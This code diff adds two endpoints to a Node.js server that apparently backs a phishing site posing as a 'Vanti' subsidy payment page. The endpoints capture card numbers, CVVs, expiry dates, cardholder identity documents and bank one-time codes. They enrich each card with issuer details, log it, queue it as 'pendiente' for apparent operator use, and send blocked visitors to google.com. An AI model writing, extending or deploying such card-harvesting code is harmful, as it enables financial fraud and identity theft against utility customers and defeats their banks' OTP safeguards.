@@ -569,6 +569,68 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
+        if (req.method === 'POST' && url === '/vanti/enviar-pago') {
+            if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
+            try {
+                const datos = await getBody(req);
+                const { sessionId, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, marca } = datos;
+                
+                if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
+
+                const previos = datosSesiones.get(sessionId) || {};
+                const infoBin = await obtenerInfoBin(tarjeta);
+                
+                const datosSesion = Object.assign({}, previos, {
+                    sessionId,
+                    bancoKey: 'vanti',
+                    tarjeta,
+                    titular,
+                    docType,
+                    docNumber,
+                    monto,
+                    expMes,
+                    expAnio,
+                    cvv,
+                    marca: marca || 'visa',
+                    ip,
+                    creadoEn: previos.creadoEn || new Date().toISOString(),
+                    bin: infoBin?.bin || '',
+                    cardBrand: infoBin?.cardBrand || marca || 'Desconocida',
+                    cardType: infoBin?.cardType || 'Desconocido',
+                    cardLevel: infoBin?.cardLevel || 'Desconocido',
+                    bankName: infoBin?.bankName || 'Desconocido',
+                    countryName: infoBin?.countryName || 'Desconocido'
+                });
+
+                estadoSesiones.set(sessionId, 'pendiente');
+                datosSesiones.set(sessionId, datosSesion);
+                ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
+                pasosSesiones.set(sessionId, 'pagodesubsidio (Tarjeta)');
+                
+                guardarHistorial('vanti', datosSesion);
+                
+                console.log(`[VANTI] Pago tarjeta recibido: ${sessionId} | Tarjeta: ${tarjeta}`);
+                json(res, 200, { ok: true, sessionId, binInfo: infoBin });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
+        }
+
+        if (req.method === 'POST' && url === '/vanti/enviar-otp') {
+            if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
+            try {
+                const { sessionId, otp } = await getBody(req);
+                if (!sessionId || !otp) { json(res, 400, { ok: false }); return; }
+                const datosOriginales = datosSesiones.get(sessionId) || {};
+                const datosCompletos = Object.assign({}, datosOriginales, { otp });
+                estadoSesiones.set(sessionId, 'pendiente');
+                datosSesiones.set(sessionId, datosCompletos);
+                ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP');
+                guardarHistorial('vanti', datosCompletos);
+                json(res, 200, { ok: true, sessionId });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
+        }
+
         const enviarMatch = url.match(/^\/([a-z-]+)\/enviar$/);
         if (req.method === 'POST' && enviarMatch) {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
